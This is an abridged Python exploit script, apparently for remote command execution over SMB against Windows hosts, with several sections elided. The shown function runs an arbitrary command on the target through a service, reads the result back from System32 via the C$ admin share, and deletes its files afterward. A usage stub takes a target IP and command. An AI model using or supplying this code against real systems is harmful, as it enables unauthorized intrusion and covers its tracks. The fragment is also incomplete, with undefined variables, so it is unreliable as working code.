...
def exploit(target, pipe_name, command):
	conn = MYSMB(target)
	...
	# ================================	
	try:
		smb_pwn(conn, info['arch'], command)
	except:
		pass
...
def smb_pwn(conn, arch, command):
	...
	full_command = 'cmd /c echo {} ^> cmdres.txt > cmdres.bat & start cmd /c cmdres.bat'.format(command)
	print("execute command : " + full_command)
	service_exec(conn, full_command)
	import time
	for i in range(2):
		print("wait ", i)
		time.sleep(1)
	print('Read file c:\\Windows\\System32\\cmdres.txt')
	tid2 = smbConn.connectTree('C$')
	fid3 = smbConn.openFile(tid2, '/windows/system32/cmdres.txt')
	res = smbConn.readNamedPipe(tid2, fid3)
	print("\n output : \n")
	print(res)
	smbConn.closeFile(tid2, fid3)
	smbConn.disconnectTree(tid2)
	print("remove file ")
	service_exec(conn, r'cmd /c del cmdres.bat cmdres.txt')
...
if len(sys.argv) < 3:
	print("{} <ip> [pipe_name] [command]".format(sys.argv[0]))
	sys.exit(1)
...
exploit(target, pipe_name, command)
print('Done')
